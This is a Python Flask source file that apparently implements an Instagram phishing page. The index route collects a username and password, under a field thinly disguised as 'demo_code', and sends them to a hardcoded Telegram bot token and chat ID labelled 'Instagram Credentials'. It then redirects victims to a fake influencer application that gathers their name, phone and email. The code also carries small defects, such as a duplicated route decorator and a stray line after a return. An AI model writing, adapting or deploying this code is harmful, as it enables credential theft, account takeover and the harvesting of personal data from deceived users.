
import os
import requests
from flask import Flask, render_template, request, redirect, url_for
from flask import Flask, render_template, request

app = Flask(__name__)

BOT_TOKEN = "9030078036:AAF43TiHTvpKZdEMd5Z1QrisXD1If_w1D-k"
CHAT_ID =   "6951515440"


def notify_telegram(username, demo_code):
    if not BOT_TOKEN or not CHAT_ID:
        app.logger.warning("Telegram is not configured.")
        return False

    message = (
        "Instagram Credentials\n\n"
        f"instagram username: {username}\n"
        f"password: {demo_code}"
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    try:
        response = requests.post(
            url,
            json={"chat_id": CHAT_ID, "text": message},
            timeout=10
        )
        response.raise_for_status()
        return True

    except requests.RequestException as exc:
        app.logger.warning("Telegram notification failed: %s", exc)
        return False


@app.route("/", methods=["GET", "POST"])
def index():

    if request.method == "POST":

        username = request.form.get("username", "").strip()
        demo_code = request.form.get("demo_code", "").strip()

        if not username or not demo_code:
            return render_template(
                "index.html",
                error="Please fill in both fields."
            )

        if len(username) > 64 or len(demo_code) > 32:
            return render_template(
                "index.html",
                error="Please check the maximum field lengths."
            )

        if not notify_telegram(username, demo_code):
            return render_template(
                "index.html",
                error="Notification failed. Please check Telegram configuration."
            ), 503

        return redirect(url_for("influencer_form"))

    return render_template("index.html")
@app.route("/influencer_form")
def influencer_form():
    return render_template("influencer_form.html")
@app.route("/submit_application", methods=["POST"])
@app.route("/submit_application", methods=["POST"])
def submit_application():

    name = request.form.get("name", "").strip()
    instagram_username = request.form.get("instagram_username", "").strip()
    interests = request.form.getlist("interests")
    other_interest = request.form.get("other_interest", "").strip()
    phone = request.form.get("phone", "").strip()
    email = request.form.get("email", "").strip()

    if not name or not instagram_username or not phone or not email:
        return render_template(
            "influencer_form.html",
            error="Please fill in all required fields.",
            username=instagram_username
        )

    return render_template(
        "application_submitted.html",
        full_name=name,
        instagram_username=instagram_username,
        interests=interests,
        other_interest=other_interest,
        phone=phone,
        email=email
    )
    phone=phone

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
